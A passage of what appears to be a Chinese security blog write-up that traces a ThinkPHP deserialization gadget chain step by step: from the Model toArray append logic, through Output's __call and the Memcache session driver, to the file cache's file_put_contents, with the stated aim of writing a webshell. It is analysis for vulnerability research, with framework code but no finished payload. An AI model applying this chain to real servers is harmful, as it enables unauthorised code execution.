language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里比较长，但是不需要进行特别详细的审计，主要是看看有没有可以利用的危险函数，或者是可以当成跳板的利用点。</p>
<p>简单看了一下，这里没有什么危险函数，所以要考虑找跳板。</p>
<p>这里比较常见的跳板主要是<code>__call()</code></p>
<p>看看有没有可控的，调用了函数的变量。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812143808226.png" alt="image-20220812143808226"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812172140357.png" alt="image-20220812172140357"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812143843351.png" alt="image-20220812143843351"></p>
<p>可以看到，一共有这三个变量调用了方法，找一下有没有可控的。</p>
<p><strong>利用PHPSTORM的查找写入值，可以比较方便的看见写入和读取的过程。</strong></p>
<h3 id="前提"><a href="#前提" class="headerlink" title="前提:"></a>前提:</h3><h4 id="首先看-relation"><a href="#首先看-relation" class="headerlink" title="首先看$relation"></a>首先看<code>$relation</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812145720654.png" alt="image-20220812145720654"></p>
<p>前两个是用getAttr()函数来返回以$key为键名的数组$data的元素值。</p>
<p>后一个是调用了Loader类中的方法，看一下方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812153658721.png" alt="image-20220812153658721"></p>
<p>函数备注了字符串命名风格转换，理论上来说对于输入的字符串<code>$name</code>是不会有什么影响的，如果<code>$name</code>可以进行控制的话，那么就可以控制到<code>$relation</code>。</p>
<p>回头查看一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812154015673.png" alt="image-20220812154015673"></p>
<p>通过查看<code>append</code>的调用，可以发现<code>append</code>是可以控制的，那么<code>$name</code>和<code>$relation</code>就是可以控制的了。可以通过这里触发<code>__call()</code>魔术方法。</p>
<h4 id="然后是看-modelRelation"><a href="#然后是看-modelRelation" class="headerlink" title="然后是看$modelRelation"></a>然后是看<code>$modelRelation</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812150206858.png" alt="image-20220812150206858"></p>
<p>这里有一个写入值的地方。</p>
<p>说实话，这部分我没看懂代码</p>
<p>查了一下之后， 对于这部分代码可以理解为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>(); <span class="comment">//relation是一个可以改变的函数名，可以根据$relatioin不同值，来使得$modelRelation等于不同函数的返回值。</span></span><br></pre></td></tr></table></figure>

<p>同时要进入这部分，需要首先满足<code>method_exists()</code>这个方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163408257.png" alt="image-20220812163408257"></p>
<p>用于这部分，就是需要满足<code>$relation()</code>所指向的方法，是存在于Model类中的方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163650728.png" alt="image-20220812163650728"></p>
<p>这里选择的是getError()这个方法，因为返回值是可以控制的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812163810108.png" alt="image-20220812163810108"></p>
<p>所以只要通过设置<code>$error</code>为一个对象，同时将<code>$relation</code>设置为getError,就可以实现对<code>$modelRelation</code>的控制，进而触发<code>__call()</code></p>
<h4 id="最后看一下-value"><a href="#最后看一下-value" class="headerlink" title="最后看一下$value"></a>最后看一下<code>$value</code></h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220812164332703.png" alt="image-20220812164332703"></p>
<p>这里可以看见两个写入值的地方，跟进一下<code>getRelationData($modelRelation)</code></p>
<p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220813230308173.png" alt="image-20220813230308173"></p>
<p>这里首先判断了一下传入的参数是Relation类的对象（也就是$modelRelation）</p>
<p>可以看见下面有一个$value &#x3D; $this-&gt;parent，而<code>$parent</code>是可控的，这里如果能控制就很方便了。</p>
<p>看看判断条件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure>

<p>分析一下：</p>
<p>这里需要<code>$this-&gt;parent</code>存在，<code>$modelRelation</code>中存在<code>isSelfRelation()</code>且返回值为0，<code>$modelRelation</code>中存在<code>getModel()</code>方法。</p>
<p>满足以上条件之后，就可以进入if，然后令<code>$value=$this-&gt;partent</code>。所以<code>$value</code>也是可以控制的</p>
<h3 id="触发-call"><a href="#触发-call" class="headerlink" title="触发__call():"></a>触发__call():</h3><p>接下来就是要考虑怎么调用函数，来触发<code>__call()</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">               <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">               &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                   <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                   <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                   <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                   <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                       <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                       <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                           <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                           <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                               <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                   <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                       <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                   &#125;</span><br><span class="line">                               &#125;</span><br><span class="line">                               <span class="keyword">continue</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h4 id="1、if-empty-this-gt-append"><a href="#1、if-empty-this-gt-append" class="headerlink" title="1、if (!empty($this-&gt;append))"></a>1、<code>if (!empty($this-&gt;append))</code></h4><p>可以直接控制，进入</p>
<h4 id="2、foreach-this-gt-append-as-key-gt-name"><a href="#2、foreach-this-gt-append-as-key-gt-name" class="headerlink" title="2、foreach ($this-&gt;append as $key =&gt; $name)"></a>2、<code>foreach ($this-&gt;append as $key =&gt; $name)</code></h4><p>控制了<code>$append</code>,可以直接进入。</p>
<h4 id="3、if-is-array-name"><a href="#3、if-is-array-name" class="headerlink" title="3、if (is_array($name))"></a>3、<code>if (is_array($name))</code></h4><p>令上一步中的<code>$name</code>不是数组，进入。</p>
<h4 id="4、elseif-strpos-name-39-39"><a href="#4、elseif-strpos-name-39-39" class="headerlink" title="4、elseif (strpos($name, &#39;.&#39;))"></a>4、<code>elseif (strpos($name, &#39;.&#39;))</code></h4><p><code>$name</code>不存在<code>.</code>，进入。</p>
<h4 id="5、if-method-exists-this-relation"><a href="#5、if-method-exists-this-relation" class="headerlink" title="5、if (method_exists($this, $relation))"></a>5、<code>if (method_exists($this, $relation))</code></h4><p>要保证在Model类中，<code>$relation</code>表示的函数存在即可进入。</p>
<h4 id="6、if-method-exists-modelRelation-39-getBindAttr-39"><a href="#6、if-method-exists-modelRelation-39-getBindAttr-39" class="headerlink" title="6、if (method_exists($modelRelation, &#39;getBindAttr&#39;))"></a>6、<code>if (method_exists($modelRelation, &#39;getBindAttr&#39;))</code></h4><p>保证在<code>$modelRelation</code>表示的类中存在<code>getBindAttr()</code>方法可以进入。</p>
<h4 id="7、if-bindAttr"><a href="#7、if-bindAttr" class="headerlink" title="7、if ($bindAttr)"></a>7、<code>if ($bindAttr)</code></h4><p>保证<code>$modelRelation-&gt;getBindAttr();</code>存在，可以进入</p>
<h4 id="8、if-isset-this-gt-data-key"><a href="#8、if-isset-this-gt-data-key" class="headerlink" title="8、if (isset($this-&gt;data[$key])) {"></a>8、<code>if (isset($this-&gt;data[$key])) &#123;</code></h4><p>使得<code>$data</code>中以<code>$key</code>为键的元素是空即可绕过。</p>
<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>对于以上的八个关键点，进行分析：</p>
<p>因为我们可以控制<code>$append</code>，所以我们可以对<code>$key</code>和<code>$name</code>的值进行控制（通过第二点的foreach）。</p>
<p>接下来第三点，我们需要保证在<code>$append</code>中元素不为数组，这很好实现，随便写入一个字符串，例如<code>Ho1L0w-By</code>（只是一个例子）即可（但实际上后面的要求不一样，只是就目前情况分析）。</p>
<p>第四点，要求<code>$name</code>，也就是<code>$append</code>中的元素中不能有<code>.</code>，写的字符串已经实现了。</p>
<p>第五点和第六点需要一起看，就像是我们之前分析<code>$relation</code>和<code>$modelRelation</code>一样，为了控制第六点中的<code>$modelRelation</code>中存在<code>getBindAttr()</code>方法，我们需要将<code>$relation</code>控制写为<code>getError</code>，这样才能控制<code>$modelRelation</code>的值，使得<code>$modelRelation</code>中存在<code>getBindAttr()</code></p>
<p>那么总结一下上面的六点：</p>
<p><code>$append</code>中的<code>$key</code>和<code>$name</code>可以控制，且<code>$name</code>的值必须为<code>getError</code>，然后通过设置<code>$error</code>值，来进一步控制<code>$modelRelation</code>。<br>而根据我们之前对于<code>getRelationData()</code>方法中，<code>$value = $this-&gt;partent</code>的分析，这里来总结一下对于<code>$modelRelation</code>需要的条件</p>
<blockquote>
<p>1、是Relation对象</p>
<p>2、存在isSelfRelation()方法，且返回值存在</p>
<p>3、存在getModel()方法，且返回值与get_class($this-&gt;parent)相同。（双等号）</p>
<p>4、存在getBindAttr()</p>
</blockquote>
<p>进行用法查找：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815145619220.png" alt="image-20220815145619220"></p>
<p>可以看见这些里面都存在Relation的类。</p>
<p>而看过<code>Relation</code>类之后可以发现，在所有的Relation的子类中都存在<code>isSelfRelation()</code>和<code>getModel()</code>。</p>
<p>这里跟进一下<code>getModel()</code>函数：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815152010343.png" alt="image-20220815152010343"></p>
<p>查找一下用法，可以知道<code>$query</code>是可控的，这里需要知道哪个类的<code>getModel()</code>方法是可控的，来控制返回值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815152358075.png" alt="image-20220815152358075"></p>
<p>可以看见是可控的，选择Query.php。</p>
<p>接下来就是在这些子类中找存在<code>getBindAttr()</code>方法的类</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815145954924.png" alt="image-20220815145954924"></p>
<p>在这里可以看见，和上面的重合点有一个，就是OneToOne.php里面。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150109645.png" alt="image-20220815150109645"></p>
<p>而这里因为OneToOne这个类是抽象类，所以还需要找到它的子类。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150422997.png" alt="image-20220815150422997"></p>
<p>这里可以选择HasOne.php。</p>
<p>这里就已经解决了<code>$modelRelation</code>的需求，可以继续看剩下的7，8点。</p>
<p>第七点需要我们返回的<code>$bindAttr</code>的值存在，看一下OneToOne.php中的<code>getBindAttr()</code>方法，可以看见是可控的，简单绕过。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815150950059.png" alt="image-20220815150950059"></p>
<p>第八点我们对$key的值溯源一下，</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815153550623.png" alt="image-20220815153550623"></p>
<p>看一下这个三元运算，只要<code>$key</code>是数字，就可以设置<code>$key</code>的值为<code>$attr</code>，可以看见<code>$key</code>和<code>$attr</code>都是我们可以进行控制的，因为<code>$bindAttr</code>可以控制。</p>
<p>到这里，已经可以执行我们需要的函数来触发<code>__call()</code>了。</p>
<h3 id="选择-call"><a href="#选择-call" class="headerlink" title="选择__call():"></a>选择__call():</h3><p>进行全局搜索，找到一个合适的__call()方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815155824034.png" alt="image-20220815155824034"></p>
<p>这里根据前人经验，可以选择Output.php（篇幅有限）</p>
<p> 这里是路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/console/Output.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815163806285.png" alt="image-20220815163806285"></p>
<p>在这里主要需要看的是这两个函数：</p>
<p><code>array_unshift()</code>，<code>call_user_func_array()</code>。</p>
<p><code>array_unshift()</code> 函数用于向数组插入新元素。新数组的值将被插入到数组的开头。</p>
<p><code>call_user_func_array</code> — 调用回调函数，并把一个数组参数作为回调函数的参数</p>
<p>可以看到第一个没什么用，但是第二个比较有意思，这里可以调用回调函数。</p>
<blockquote>
<p>什么是回调函数？</p>
<p>通俗的来说，回调函数是一个我们定义的函数，但是不是我们直接来调用，而是通过另一个函数来调用，这个函数通过接收回调函数的名字和参数来实现对它的调用。</p>
</blockquote>
<p>看看手册里的说明。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815164709740.png" alt="image-20220815164709740"></p>
<p>因为是在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>对__call()进行的触发，所以此处在__call()中的参数，<code>$method</code>是<code>getAttr()</code>，<code>$args</code>是<code>$attr</code>的值。</p>
<p>第一个if中，可以看见styles是可控的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172139229.png" alt="image-20220815172139229"></p>
<p>将<code>$styles</code>中的值多添加一个<code>getAttr()</code>即可进入</p>
<p>这里跟进类中的<code>block</code>方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172258334.png" alt="image-20220815172258334"></p>
<p>跟进<code>writeln</code>(一看就很敏感)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815172417267.png" alt="image-20220815172417267"></p>
<p>跟进<code>write</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815173426692.png" alt="image-20220815173426692"></p>
<p>查看一下<code>$handle</code>的用法</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815174938200.png" alt="image-20220815174938200"></p>
<p>反序列化是不会调用<code>__construct()</code>的，因此<code>$handle</code>可控</p>
<p>因此可以全局查看一下哪里的write可以利用：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815175911936.png" alt="image-20220815175911936"></p>
<p>这里可以看见有好几个write函数存在，也有多个可以利用的点。这里主要让我们看一下<code>Memcache.php</code>中的Write函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/session/driver/Memcache.php</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220815180145913.png" alt="image-20220815180145913"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220815181922079.png" alt="image-20220815181922079"></p>
<p><code>$handler</code>可控，因此可以随便调用任何文件中的set函数，全局查找set函数：</p>
<p>这里还是使用Seay进行查找。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220820163631897.png" alt="image-20220820163631897"></p>
<p>这里可以看见很多不同的函数使用文件，可以都看一下，这里如果是想要使用写入webshell，主要的利用点在<code>File.php</code>文件中，文件路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">thinkphp/library/think/cache/driver/File.php</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220820164054864.png" alt="image-20220820164054864"></p>
<p>可以看见危险函数<code>file_put_contents($filename,$data)</code>，这里可以用来写入webshell。具体内容可以由我们自己决定。</p>
<p>这里一般来说，只要我们使用一个<code>&lt;?php phpinfo(); ?&gt;</code>，然后访问对应文件，出现了详情页面，就可以用来证明漏洞存在了。</p>
<p>这里分析一下如何利用到这个<code>file_put_contents()</code>函数。</p>
<p>第一个if是判断<code>$expire</code>的，对<code>$expire</code>进行了设置。</p>
<p>第二个if用来判断<code>$expire</code>是不是<code>DataTime</code>的子类，设置时间戳。</p>
<p>然后将<code>$filename</code>调用<code>getCacheKey()</code>函数进行了值的设置，因为<code>$filename</code>是<code>file_put_contents()</code>函数中的一个参数，所以这里我们跟进函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$auto</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>); <span class="comment">//$name进行md5加密</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) &#123; </span><br><span class="line">           <span class="comment">// 使用子目录</span></span><br><span class="line">           <span class="variable">$name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">2</span>) . DS . <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">2</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">           <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . DS . <span class="variable">$name</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">       <span class="variable">$dir</span>      = <span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以看见两个if主要是用来更改文件名的，因为<code>$options</code>可以控制，所以可以直接修改之后绕过。</p>
<p>然后到了<code>$filename</code>进行设置的地方了，这里同样因为<code>$options</code>可以进行控制，所以基本是可以确定文件名是可控的，同时文件的后缀也是被写死了是.php。</p>
<p>后面的函数不会影响<code>$filename</code>，因此可以确定<code>$filename</code>可以控制。</p>
<p>继续分析，可以看见$data作为<code>file_put_contents()</code>函数的参数是进行序列化出来的，参数是使用的<code>$value</code>。</p>
<p>这里会出现两个问题，因为<code>$value</code>这个值是调用函数时传入的参数，在<code>writeln</code>中一路传过来的时候，已经是被确定了为布尔值的<code>true</code>，因此我们不能对<code>$value</code>达成控制的效果。</p>
<p>而这里，也可以看见<code>$data</code>的值也是被写死了，并且存在一个<code>exit()</code>函数，需要进行死亡绕过。</p>
